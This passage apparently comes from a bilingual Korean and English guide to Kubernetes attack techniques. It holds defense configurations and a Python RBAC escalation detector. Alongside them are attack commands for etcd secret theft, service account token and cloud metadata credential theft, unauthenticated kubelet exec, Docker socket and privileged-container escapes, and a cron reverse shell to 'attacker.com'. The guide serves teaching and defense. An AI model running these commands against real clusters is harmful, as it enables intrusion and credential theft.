                f"  ! {admin['subject_kind']}/{admin['subject_name']} "
                f"(네임스페이스: {admin.get('subject_namespace', 'N/A')}) "
                f"← {admin['binding_name']}"
            )
    else:
        print("  없음")

    print("\n[권한 에스컬레이션 경로]")
    colors = {
        EscalationRisk.CRITICAL: "\033[91m",
        EscalationRisk.HIGH: "\033[93m",
        EscalationRisk.MEDIUM: "\033[94m",
        EscalationRisk.LOW: "\033[92m",
    }
    reset = "\033[0m"

    risk_order = [
        EscalationRisk.CRITICAL, EscalationRisk.HIGH,
        EscalationRisk.MEDIUM, EscalationRisk.LOW,
    ]
    sorted_paths = sorted(
        result.escalation_paths,
        key=lambda ep: risk_order.index(ep.risk),
    )

    if sorted_paths:
        for ep in sorted_paths:
            color = colors.get(ep.risk, reset)
            print(
                f"\n  {color}[{ep.risk.value}]{reset} "
                f"{ep.subject_kind}/{ep.subject_name}"
            )
            print(f"  경로: {' → '.join(ep.path)}")
            print(f"  설명: {ep.description}")
            print(f"  기법: {ep.technique}")
            print(f"  조치: {ep.mitigation}")
    else:
        print("  탐지된 에스컬레이션 경로 없음")

    if result.orphaned_bindings:
        print("\n[고아 바인딩]")
        for ob in result.orphaned_bindings:
            print(f"  - {ob}")

    print("\n" + "=" * 70)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Kubernetes RBAC 권한 에스컬레이션 경로 탐지 도구",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  # 기본 분석 (텍스트 출력)
  %(prog)s

  # JSON 출력 (CI/CD 통합)
  %(prog)s --format json

  # CRITICAL 경로만 필터링
  %(prog)s --format json | jq '.escalation_paths[] | select(.risk == "CRITICAL")'

  # 특정 서비스 어카운트 경로 확인
  %(prog)s --format json | jq '.escalation_paths[] | select(.subject | contains("my-sa"))'
        """,
    )
    parser.add_argument(
        "--format",
        choices=["text", "json"],
        default="text",
        help="출력 형식 (기본: text)",
    )
    parser.add_argument(
        "--kubeconfig",
        help="kubeconfig 파일 경로 (기본: ~/.kube/config)",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    if args.kubeconfig:
        import os
        os.environ["KUBECONFIG"] = args.kubeconfig

    result = analyze_rbac()
    print_rbac_report(result, args.format)

    critical_count = sum(
        1 for ep in result.escalation_paths
        if ep.risk == EscalationRisk.CRITICAL
    )
    return 1 if critical_count > 0 else 0


if __name__ == "__main__":
    sys.exit(main())
```

### 도구 사용법

```bash
# 기본 분석
python rbac_escalation_detector.py

# JSON 출력
python rbac_escalation_detector.py --format json

# CRITICAL 경로만 필터링
python rbac_escalation_detector.py --format json | \
  jq '.escalation_paths[] | select(.risk == "CRITICAL")'

# cluster-admin 바인딩 확인
python rbac_escalation_detector.py --format json | \
  jq '.cluster_admin_subjects'

# 특정 kubeconfig 사용
python rbac_escalation_detector.py --kubeconfig /path/to/kubeconfig

# CI/CD 파이프라인에서 사용 (CRITICAL 발견 시 실패)
python rbac_escalation_detector.py || echo "RBAC 보안 문제 발견!"
```

---

## 방어 요약

### Kubernetes 보안 강화 체크리스트

```
인증/인가:
☐ RBAC 최소 권한 원칙 적용
☐ cluster-admin 바인딩 최소화
☐ 서비스 어카운트 토큰 자동 마운트 비활성화
☐ 오래된/미사용 ClusterRoleBinding 정기 정리

etcd:
☐ etcd 암호화 활성화 (EncryptionConfiguration)
☐ etcd 포트(2379) 방화벽으로 격리
☐ etcd 클라이언트 인증서 접근 제어
☐ etcd 백업 암호화 저장

네트워크:
☐ kubelet API(10250) 인증 강제 (anonymous-auth: false)
☐ API 서버 외부 노출 금지
☐ Dashboard 인증 강제 또는 제거
☐ NetworkPolicy로 Pod 간 통신 제한

런타임:
☐ Pod Security Standards (Restricted 수준) 적용
☐ 특권 컨테이너 차단 (OPA Gatekeeper)
☐ hostPID, hostNetwork, hostIPC 금지
☐ hostPath 마운트 제한
☐ 컨테이너 root 실행 금지

모니터링:
☐ Falco 런타임 이상 탐지 배포
☐ API 서버 감사 로그 활성화
☐ etcd 접근 모니터링
☐ RBAC 변경 알림 설정
```

---

## 참고 자료

- [Kubernetes RBAC 문서](https://kubernetes.io/docs/reference/access-authn-authz/rbac/)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [Microsoft Kubernetes Threat Matrix](https://www.microsoft.com/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
- [NCC Group Kubernetes Pentest Methodology](https://github.com/averonesis/pentest-kubernetes)
- [Bad Pods: Kubernetes Pod Privilege Escalation](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation)
- [CVE-2018-1002105](https://nvd.nist.gov/vuln/detail/CVE-2018-1002105)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
- [NSA Kubernetes Hardening Guide](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF)

---

<a name="english"></a>

# Cloud Native Attack Techniques

## Table of Contents
1. Direct etcd Access Attacks (Kubernetes Secret Theft)
2. RBAC Abuse (ClusterAdmin Escalation)
3. Container Escape and Node Takeover
4. Service Account Token Abuse
5. Kubernetes API Server Exploit Case Studies
6. Python: RBAC Privilege Escalation Path Detection Tool

---

## 1. Direct etcd Access Attacks (Kubernetes Secret Theft)

### What is etcd?

etcd is Kubernetes' distributed key-value store that holds all cluster state information.
All Kubernetes resources including Secrets, ConfigMaps, and Pod configurations are stored here.

```
Kubernetes cluster data flow:
kubectl → kube-apiserver → etcd (persistent storage)
                         ↓
                    All secrets, tokens, and certificates stored here
```

### Attack Scenario 1: Exposed etcd Port

```bash
# Vulnerable configuration: etcd exposed externally (2379/tcp)
# Attacker directly accesses etcd to steal secrets

# Set etcd client API version
export ETCDCTL_API=3

# List all keys
etcdctl --endpoints=http://<etcd-ip>:2379 get / --prefix --keys-only

# Kubernetes secret path
etcdctl --endpoints=http://<etcd-ip>:2379 \
  get /registry/secrets/default/db-password

# Decode the result (Base64-encoded values)
etcdctl ... | base64 -d
```

**Detected data structure**:
```
/registry/secrets/{namespace}/{secret-name}
/registry/serviceaccounts/{namespace}/{sa-name}
/registry/configmaps/{namespace}/{cm-name}
/registry/pods/{namespace}/{pod-name}
```

### Attack Scenario 2: Access via Client Certificate

```bash
# After gaining access to the control plane, use certificates to access etcd
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/ --prefix --keys-only

# Steal a specific secret
etcdctl --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get /registry/secrets/kube-system/bootstrap-token-abcdef
```

### Defense Methods

```yaml
# 1. Configure etcd encryption (EncryptionConfiguration)
apiVersion: apiserver.config.k8s.io/v1
kind: EncryptionConfiguration
resources:
- resources:
  - secrets
  - configmaps
  providers:
  - aescbc:
      keys:
      - name: key1
        secret: <base64-encoded-32-byte-key>
  - identity: {}  # Allow reading unencrypted resources (for migration)
```

```bash
# 2. Network isolation for etcd
# Configure firewall so only kube-apiserver can access etcd
iptables -A INPUT -p tcp --dport 2379 -s <kube-apiserver-ip> -j ACCEPT
iptables -A INPUT -p tcp --dport 2379 -j DROP

# 3. Encrypt etcd backups
etcdctl snapshot save snapshot.db
gpg --symmetric --cipher-algo AES256 snapshot.db
```

---

## 2. RBAC Abuse (ClusterAdmin Escalation)

### Kubernetes RBAC Basic Structure

```
RBAC components:
├── Role/ClusterRole      - Define sets of permissions
├── RoleBinding           - Bind Role to user/group/SA (namespace-scoped)
└── ClusterRoleBinding    - Bind ClusterRole globally
```

### Escalation Path 1: Excessive Verb Permissions

```yaml
# Dangerous Role: Permissions to create and bind ClusterRoles
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: "dangerous-role"
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["clusterroles", "clusterrolebindings"]
  verbs: ["create", "update", "patch"]  # These permissions allow creating ClusterAdmin!
```

**Attack**:
```bash
# If attacker has dangerous-role
# Create a new ClusterAdmin binding
kubectl create clusterrolebinding pwned \
  --clusterrole=cluster-admin \
  --serviceaccount=default:compromised-sa
```

### Escalation Path 2: Pods/Exec Permission

```yaml
# pods/exec permission → execute commands in arbitrary Pods
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]
```

**Attack**:
```bash
# Exec into a Pod with a privileged container
kubectl exec -it privileged-pod -- /bin/bash
# Escape container and access the node
```

### Escalation Path 3: Secrets Read Permission

```yaml
# Being able to read secrets allows service account token theft
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "list"]
```

**Attack**:
```bash
# List all secrets
kubectl get secrets -A

# Steal service account token from kube-system
kubectl get secret -n kube-system \
  $(kubectl get sa -n kube-system -o jsonpath='{.items[0].secrets[0].name}') \
  -o jsonpath='{.data.token}' | base64 -d
```

### Escalation Path 4: Node Proxy Permission

```yaml
# nodes/proxy permission enables direct kubelet API access
rules:
- apiGroups: [""]
  resources: ["nodes/proxy"]
  verbs: ["get", "create"]
```

**Attack**:
```bash
# Execute commands on the node via kubelet API
kubectl get --raw /api/v1/nodes/<node-name>/proxy/exec?command=id&container=<container>
```

### Escalation Path 5: MutatingWebhookConfiguration Modification

```yaml
# Modifying Admission Webhook → inject malicious sidecar into every new Pod
rules:
- apiGroups: ["admissionregistration.k8s.io"]
  resources: ["mutatingwebhookconfigurations"]
  verbs: ["create", "update", "patch"]
```

### RBAC Hardening Recommendations

```yaml
# Safe Role example: principle of least privilege
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  namespace: production
  name: app-reader
rules:
# Specific resources only, specific verbs only
- apiGroups: [""]
  resources: ["pods", "services"]
  verbs: ["get", "list", "watch"]
  # resourceNames: ["specific-pod"]  # Can restrict to specific resources

---
# Dangerous permission combinations to avoid:
# - secrets + (get/list/watch)
# - clusterroles/clusterrolebindings + (create/update/patch/bind)
# - pods/exec + create
# - nodes/proxy + (get/create)
# - * (wildcard) + * combination
```

---

## 3. Container Escape and Node Takeover

### Escape Technique 1: Privileged Container Abuse

```bash
# Mount host filesystem from a privileged container
ls /dev/  # List host devices
mount /dev/xvda1 /mnt  # Mount host root partition

# Register a crontab on the host (establish persistence)
echo "* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1" \
  >> /mnt/etc/cron.d/backdoor

# Enter the host environment using chroot
chroot /mnt /bin/bash
```

### Escape Technique 2: hostPID + nsenter

```bash
# From a container with hostPID: true
# Switch namespaces via nsenter targeting host PID 1 (init)
nsenter --target 1 --mount --uts --ipc --net --pid -- bash

# Now in host environment
whoami  # root
hostname  # host name
```

### Escape Technique 3: Docker Socket Mount

```bash
# When /var/run/docker.sock is mounted
ls /var/run/docker.sock  # Confirm socket exists

# Create a privileged container via Docker API
curl -s --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu","Cmd":["/bin/bash"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create

# Or use the docker CLI
docker run -v /:/host --privileged --rm -it ubuntu \
  chroot /host bash
```

### Escape Technique 4: runc CVE-2019-5736

```
CVE-2019-5736 (Runc container escape):
1. Attacker overwrites /proc/self/exe from inside the container
2. runc binary is replaced with an executable inside the container
3. On the next runc execution (exec or new container start), malicious code runs
Affected: runc version 1.0-rc6 and below
```

### Escape Technique 5: Kernel Exploit (Dirty Cow, etc.)

```bash
# Containers share the host kernel, so
# kernel exploits for privilege escalation also affect the host

# Check kernel version
uname -r

# Known vulnerabilities:
# CVE-2016-5195 (Dirty COW) - kernels before 4.8
# CVE-2022-0847 (Dirty Pipe) - kernels before 5.16.11
# CVE-2022-0185 - filesystem context API vulnerability
```

### Post-Node-Takeover Actions

```bash
# Access the entire cluster from the node
# 1. Access the API server using kubelet certificates
ls /var/lib/kubelet/pki/
export KUBECONFIG=/etc/kubernetes/kubelet.conf

# 2. Collect service account tokens from all Pods
find /var/lib/kubelet/pods -name "token" -exec cat {} \;

# 3. Access kube-system secrets
kubectl get secrets -n kube-system
```

---

## 4. Service Account Token Abuse

### Default Token Location

```bash
# Location of the auto-mounted token inside a Pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
```

### Accessing the API Server Using a Token

```bash
# Set environment variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API_SERVER="https://kubernetes.default.svc"
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Check current permissions
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/namespaces/$NAMESPACE/pods"

# Attempt to access secrets in all namespaces
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  "$API_SERVER/api/v1/secrets"

# Check permissions (self-subject-access-review)
curl -s -k \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"list","resource":"secrets"}}}' \
  "$API_SERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews"
```

### Projected Token Abuse

```yaml
# Service account token projection configuration
apiVersion: v1
kind: Pod
spec:
  volumes:
  - name: token
    projected:
      sources:
      - serviceAccountToken:
          path: token
          expirationSeconds: 86400  # 1 day (shorter is safer)
          audience: "api"
```

**Defense**:
```yaml
# Disable automountServiceAccountToken
apiVersion: v1
kind: ServiceAccount
metadata:
  name: my-sa
automountServiceAccountToken: false  # At the ServiceAccount level

---
# Also disable at the Pod level
spec:
  automountServiceAccountToken: false
```

---

## 5. Kubernetes API Server Exploit Case Studies

### Case 1: Unauthenticated API Server Exposure (CVE-2018-1002105)

```
CVE-2018-1002105: Kubernetes Privilege Escalation
- Affected versions: Kubernetes <= 1.10, 1.11.x < 1.11.5, 1.12.x < 1.12.3
- Vulnerability: Authentication headers preserved during request upgrade to aggregated API server
- Attack: Access arbitrary API endpoints with low-level privileges
- Severity: CVSS 9.8 (Critical)

Attack flow:
1. Attacker has pods/exec or pods/portforward permission
2. Upgrade request to aggregated API
3. Auth headers are preserved, granting cluster-admin level access
```

### Case 2: Unauthenticated Kubernetes Dashboard Exposure

```bash
# Vulnerable configuration: skip-login flag enabled
# kubectl proxy or direct exposure
kubectl proxy --port=8001 &
# http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/
# https:kubernetes-dashboard:/proxy/#!/overview?namespace=_all

# Real case: Tesla's Kubernetes dashboard exposed without authentication in 2019
# → Cryptocurrency mining malware deployed
```

### Case 3: Unauthenticated kubelet API Exposure (10250/tcp)

```bash
# Access kubelet API without authentication
# /pods: list all Pods on the node
curl -k https://<node-ip>:10250/pods

# /exec: execute commands inside a container (WebSocket)
# In older versions, exec was possible without authentication
curl -k https://<node-ip>:10250/exec/<ns>/<pod>/<container> \
  -d "command=ls&command=-la&input=1&output=1&tty=1"

# /run: execute commands inside a container
curl -k https://<node-ip>:10250/run/<ns>/<pod>/<container> \
  -d "cmd=id"
```

### Case 4: Metadata API Access via SSRF

```bash
# Access cloud metadata API from inside a container
# AWS IMDSv1 (vulnerable version)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP Metadata API
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata API
curl -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

---

## 6. Python: RBAC Privilege Escalation Path Detection Tool

```python
#!/usr/bin/env python3
"""
Kubernetes RBAC Privilege Escalation Path Detection Tool

Analyzes the RBAC configuration of a Kubernetes cluster
to detect possible privilege escalation paths.
"""

import argparse
import json
import subprocess
import sys
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Any


class EscalationRisk(Enum):
    CRITICAL = "CRITICAL"  # Direct cluster-admin access possible
    HIGH = "HIGH"          # Indirect privilege escalation possible
    MEDIUM = "MEDIUM"      # Potential risk
    LOW = "LOW"            # Monitoring required


@dataclass
class EscalationPath:
    subject_name: str
    subject_kind: str
    subject_namespace: str | None
    path: list[str]
    risk: EscalationRisk
    description: str
    technique: str
    mitigation: str


@dataclass
class RBACAnalysisResult:
    cluster_admin_subjects: list[dict[str, Any]] = field(default_factory=list)
    escalation_paths: list[EscalationPath] = field(default_factory=list)
    dangerous_permissions: list[dict[str, Any]] = field(default_factory=list)
    orphaned_bindings: list[str] = field(default_factory=list)

    def summary(self) -> dict[str, Any]:
        risk_counts: dict[str, int] = {}
        for ep in self.escalation_paths:
            risk_counts[ep.risk.value] = risk_counts.get(ep.risk.value, 0) + 1
        return {
            "cluster_admin_count": len(self.cluster_admin_subjects),
            "escalation_paths": risk_counts,
            "dangerous_permissions": len(self.dangerous_permissions),
            "orphaned_bindings": len(self.orphaned_bindings),
        }


# Dangerous permission combinations that enable privilege escalation
DANGEROUS_PERMISSIONS: list[dict[str, Any]] = [
    {
        "name": "secrets_read",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["secrets"],
        "verbs": ["get", "list", "watch"],
        "description": "Secrets read access - allows service account token theft",
        "technique": "T1552.007 - Kubernetes Secrets",
        "mitigation": "Remove secrets read permissions; allow access to specific secrets only",
    },
    {
        "name": "rbac_escalation",
        "risk": EscalationRisk.CRITICAL,
        "api_groups": ["rbac.authorization.k8s.io"],
        "resources": ["clusterroles", "clusterrolebindings", "roles", "rolebindings"],
        "verbs": ["create", "update", "patch", "bind", "escalate"],
        "description": "RBAC resource modification - allows creating ClusterAdmin",
        "technique": "T1078 - Valid Accounts",
        "mitigation": "Remove RBAC resource modification permissions; manage RBAC via GitOps",
    },
    {
        "name": "pod_exec",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["pods/exec", "pods/attach"],
        "verbs": ["create", "get"],
        "description": "Pod exec permission - allows escape from privileged containers",
        "technique": "T1609 - Container Administration Command",
        "mitigation": "Restrict pods/exec permission to specific Pods/namespaces",
    },
    {
        "name": "node_proxy",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["nodes/proxy"],
        "verbs": ["get", "create"],
        "description": "Node proxy access - enables direct kubelet API access",
        "technique": "T1609 - Container Administration Command",
        "mitigation": "Remove nodes/proxy permission",
    },
    {
        "name": "pods_create",
        "risk": EscalationRisk.HIGH,
        "api_groups": [""],
        "resources": ["pods"],
        "verbs": ["create", "update", "patch"],
        "description": "Pod creation permission - allows node access via privileged Pod",
        "technique": "T1610 - Deploy Container",
        "mitigation": "Apply Pod Security Standards; block privileged containers with OPA Gatekeeper",
    },
    {
        "name": "admission_webhook",
        "risk": EscalationRisk.CRITICAL,
        "api_groups": ["admissionregistration.k8s.io"],
        "resources": [
            "mutatingwebhookconfigurations",
            "validatingwebhookconfigurations",
        ],
        "verbs": ["create", "update", "patch"],
        "description": "Webhook modification - allows injecting malicious sidecars into all Pods",
        "technique": "T1055 - Process Injection",
        "mitigation": "Remove Admission Webhook modification permissions",
    },
    {
        "name": "daemonset_create",
        "risk": EscalationRisk.HIGH,
        "api_groups": ["apps"],
        "resources": ["daemonsets"],
        "verbs": ["create", "update", "patch"],
        "description": "DaemonSet creation - allows deploying malicious containers on all nodes",
        "technique": "T1610 - Deploy Container",
        "mitigation": "Restrict DaemonSet modification to specific namespaces",
    },
    {
        "name": "token_request",
        "risk": EscalationRisk.MEDIUM,
        "api_groups": [""],
        "resources": ["serviceaccounts/token"],
        "verbs": ["create"],
        "description": "Service account token creation - allows issuing tokens for arbitrary SAs",
        "technique": "T1528 - Steal Application Access Token",
        "mitigation": "Restrict permission to specific service accounts",
    },
]


def run_kubectl_json(args: list[str]) -> dict[str, Any] | None:
    """Execute kubectl command and parse JSON output."""
    try:
        result = subprocess.run(
            ["kubectl"] + args + ["-o", "json"],
            capture_output=True,
            text=True,
            timeout=30,
            check=True,
        )
        return json.loads(result.stdout)
    except subprocess.CalledProcessError as e:
        print(f"[WARNING] kubectl error: {e.stderr.strip()[:100]}", file=sys.stderr)
        return None
    except (json.JSONDecodeError, subprocess.TimeoutExpired):
        return None


def get_all_rbac_data() -> tuple[
    list[dict[str, Any]],
    list[dict[str, Any]],
    list[dict[str, Any]],
    list[dict[str, Any]],
]:
    """Collect all RBAC resources (in parallel)."""
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {
            "clusterroles": executor.submit(
                run_kubectl_json, ["get", "clusterroles"]
            ),
            "clusterrolebindings": executor.submit(
                run_kubectl_json, ["get", "clusterrolebindings"]
            ),
            "roles": executor.submit(
                run_kubectl_json, ["get", "roles", "--all-namespaces"]
            ),
            "rolebindings": executor.submit(
                run_kubectl_json, ["get", "rolebindings", "--all-namespaces"]
            ),
        }
        results = {name: future.result() for name, future in futures.items()}

    def extract_items(data: dict[str, Any] | None) -> list[dict[str, Any]]:
        return data.get("items", []) if data else []

    return (
        extract_items(results["clusterroles"]),
        extract_items(results["clusterrolebindings"]),
        extract_items(results["roles"]),
        extract_items(results["rolebindings"]),
    )


def check_permission_match(
    rule: dict[str, Any], dangerous: dict[str, Any]
) -> bool:
    """Check if a rule matches a dangerous permission combination."""
    rule_api_groups = set(rule.get("apiGroups", []))
    rule_resources = set(rule.get("resources", []))
    rule_verbs = set(rule.get("verbs", []))

    # Handle wildcards
    if "*" in rule_api_groups or "*" in rule_resources or "*" in rule_verbs:
        return True

    api_match = bool(
        set(dangerous["api_groups"]) & rule_api_groups
        or "*" in rule_api_groups
    )
    resource_match = bool(
        set(dangerous["resources"]) & rule_resources
        or "*" in rule_resources
    )
    verb_match = bool(
        set(dangerous["verbs"]) & rule_verbs
        or "*" in rule_verbs
    )

    return api_match and resource_match and verb_match


def find_cluster_admin_subjects(
    crbs: list[dict[str, Any]]
) -> list[dict[str, Any]]:
    """Detect subjects bound to cluster-admin."""
    admins: list[dict[str, Any]] = []
    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        if role_ref.get("name") == "cluster-admin":
            for subject in binding.get("subjects", []):
                admins.append({
                    "binding_name": binding["metadata"]["name"],
                    "subject_kind": subject.get("kind"),
                    "subject_name": subject.get("name"),
                    "subject_namespace": subject.get("namespace"),
                })
    return admins


def find_dangerous_role_permissions(
    clusterroles: list[dict[str, Any]],
    roles: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    """Detect Role/ClusterRole with dangerous permissions."""
    dangerous_roles: list[dict[str, Any]] = []
    all_roles = [
        (r, "ClusterRole", None) for r in clusterroles
    ] + [
        (r, "Role", r["metadata"].get("namespace")) for r in roles
    ]

    for role, kind, namespace in all_roles:
        role_name = role["metadata"]["name"]
        matched_dangers: list[dict[str, Any]] = []
        for rule in role.get("rules", []):
            for dangerous in DANGEROUS_PERMISSIONS:
                if check_permission_match(rule, dangerous):
                    matched_dangers.append(dangerous)
        if matched_dangers:
            dangerous_roles.append({
                "role_kind": kind,
                "role_name": role_name,
                "namespace": namespace,
                "dangers": matched_dangers,
            })

    return dangerous_roles


def find_escalation_paths(
    dangerous_roles: list[dict[str, Any]],
    crbs: list[dict[str, Any]],
    rbs: list[dict[str, Any]],
) -> list[EscalationPath]:
    """Detect RBAC escalation paths."""
    paths: list[EscalationPath] = []

    # Map Role name to danger information
    role_danger_map: dict[str, dict[str, Any]] = {}
    for dr in dangerous_roles:
        key = f"{dr['role_kind']}/{dr['role_name']}"
        role_danger_map[key] = dr

    # Analyze ClusterRoleBindings
    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        role_key = f"ClusterRole/{role_ref.get('name', '')}"
        if role_key not in role_danger_map:
            continue

        dr = role_danger_map[role_key]
        binding_name = binding["metadata"]["name"]

        for subject in binding.get("subjects", []):
            for danger in dr["dangers"]:
                paths.append(
                    EscalationPath(
                        subject_name=subject.get("name", ""),
                        subject_kind=subject.get("kind", ""),
                        subject_namespace=subject.get("namespace"),
                        path=[
                            f"{subject.get('kind')}/{subject.get('name')}",
                            f"ClusterRoleBinding/{binding_name}",
                            f"ClusterRole/{role_ref.get('name')}",
                            f"Permission: {danger['name']}",
                        ],
                        risk=danger["risk"],
                        description=danger["description"],
                        technique=danger["technique"],
                        mitigation=danger["mitigation"],
                    )
                )

    # Analyze RoleBindings
    for binding in rbs:
        role_ref = binding.get("roleRef", {})
        namespace = binding["metadata"].get("namespace", "")
        role_kind = role_ref.get("kind", "Role")
        role_key = f"{role_kind}/{role_ref.get('name', '')}"
        if role_key not in role_danger_map:
            continue

        dr = role_danger_map[role_key]
        binding_name = binding["metadata"]["name"]

        for subject in binding.get("subjects", []):
            for danger in dr["dangers"]:
                paths.append(
                    EscalationPath(
                        subject_name=subject.get("name", ""),
                        subject_kind=subject.get("kind", ""),
                        subject_namespace=subject.get("namespace") or namespace,
                        path=[
                            f"{subject.get('kind')}/{subject.get('name')}",
                            f"RoleBinding/{namespace}/{binding_name}",
                            f"{role_kind}/{role_ref.get('name')}",
                            f"Permission: {danger['name']}",
                        ],
                        risk=danger["risk"],
                        description=danger["description"],
                        technique=danger["technique"],
                        mitigation=danger["mitigation"],
                    )
                )

    return paths


def find_orphaned_bindings(
    crbs: list[dict[str, Any]],
    rbs: list[dict[str, Any]],
    clusterroles: list[dict[str, Any]],
    roles: list[dict[str, Any]],
) -> list[str]:
    """Detect orphaned bindings that reference non-existent Roles."""
    orphaned: list[str] = []
    cr_names = {r["metadata"]["name"] for r in clusterroles}
    role_names = {
        f"{r['metadata']['namespace']}/{r['metadata']['name']}"
        for r in roles
    }

    for binding in crbs:
        role_ref = binding.get("roleRef", {})
        if role_ref.get("kind") == "ClusterRole":
            if role_ref.get("name") not in cr_names:
                orphaned.append(
                    f"ClusterRoleBinding/{binding['metadata']['name']} → "
                    f"ClusterRole/{role_ref.get('name')} (does not exist)"
                )

    for binding in rbs:
        role_ref = binding.get("roleRef", {})
        ns = binding["metadata"].get("namespace", "")
        role_key = f"{ns}/{role_ref.get('name', '')}"
        if role_ref.get("kind") == "Role" and role_key not in role_names:
            orphaned.append(
                f"RoleBinding/{ns}/{binding['metadata']['name']} → "
                f"Role/{role_ref.get('name')} (does not exist)"
            )

    return orphaned


def analyze_rbac() -> RBACAnalysisResult:
    """Run full RBAC analysis."""
    print("[INFO] Collecting RBAC data...", file=sys.stderr)
    clusterroles, crbs, roles, rbs = get_all_rbac_data()

    print(
        f"[INFO] Collection complete - ClusterRole: {len(clusterroles)}, "
        f"CRB: {len(crbs)}, Role: {len(roles)}, RB: {len(rbs)}",
        file=sys.stderr,
    )

    result = RBACAnalysisResult()

    # Run analyses in parallel
    with ThreadPoolExecutor(max_workers=4) as executor:
        futures = {
            "cluster_admin": executor.submit(find_cluster_admin_subjects, crbs),
            "dangerous_roles": executor.submit(
                find_dangerous_role_permissions, clusterroles, roles
            ),
            "orphaned": executor.submit(
                find_orphaned_bindings, crbs, rbs, clusterroles, roles
            ),
        }

        analysis_results = {}
        for name, future in futures.items():
            try:
                analysis_results[name] = future.result()
            except Exception as e:
                print(f"[WARNING] {name} analysis failed: {e}", file=sys.stderr)
                analysis_results[name] = []

    result.cluster_admin_subjects = analysis_results.get("cluster_admin", [])
    result.dangerous_permissions = analysis_results.get("dangerous_roles", [])
    result.orphaned_bindings = analysis_results.get("orphaned", [])

    # Use dangerous_roles result for escalation paths
    result.escalation_paths = find_escalation_paths(
        result.dangerous_permissions, crbs, rbs
    )

    print(
        f"[INFO] Analysis complete - Escalation paths found: {len(result.escalation_paths)}",
        file=sys.stderr,
    )
    return result


def print_rbac_report(result: RBACAnalysisResult, fmt: str) -> None:
    """Print RBAC analysis results."""
    if fmt == "json":
        report = {
            "summary": result.summary(),
            "cluster_admin_subjects": result.cluster_admin_subjects,
            "escalation_paths": [
                {
                    "subject": f"{ep.subject_kind}/{ep.subject_name}",
                    "namespace": ep.subject_namespace,
                    "risk": ep.risk.value,
                    "path": ep.path,
                    "description": ep.description,
                    "technique": ep.technique,
                    "mitigation": ep.mitigation,
                }
                for ep in result.escalation_paths
            ],
            "orphaned_bindings": result.orphaned_bindings,
        }
        print(json.dumps(report, ensure_ascii=False, indent=2))
        return

    # Text report
    print("\n" + "=" * 70)
    print("  Kubernetes RBAC Privilege Escalation Analysis Results")
    print("=" * 70)
    summary = result.summary()
    print(f"  cluster-admin bindings: {summary['cluster_admin_count']}")
    print(f"  Escalation paths: {json.dumps(summary['escalation_paths'], ensure_ascii=False)}")
    print(f"  Orphaned bindings: {summary['orphaned_bindings']}")

    print("\n[cluster-admin Bindings]")
    if result.cluster_admin_subjects:
        for admin in result.cluster_admin_subjects:
            print(
                f"  ! {admin['subject_kind']}/{admin['subject_name']} "
                f"(namespace: {admin.get('subject_namespace', 'N/A')}) "
                f"← {admin['binding_name']}"
            )
    else:
        print("  None")

    print("\n[Privilege Escalation Paths]")
    colors = {
        EscalationRisk.CRITICAL: "\033[91m",
        EscalationRisk.HIGH: "\033[93m",
        EscalationRisk.MEDIUM: "\033[94m",
        EscalationRisk.LOW: "\033[92m",
    }
    reset = "\033[0m"

    risk_order = [
        EscalationRisk.CRITICAL, EscalationRisk.HIGH,
        EscalationRisk.MEDIUM, EscalationRisk.LOW,
    ]
    sorted_paths = sorted(
        result.escalation_paths,
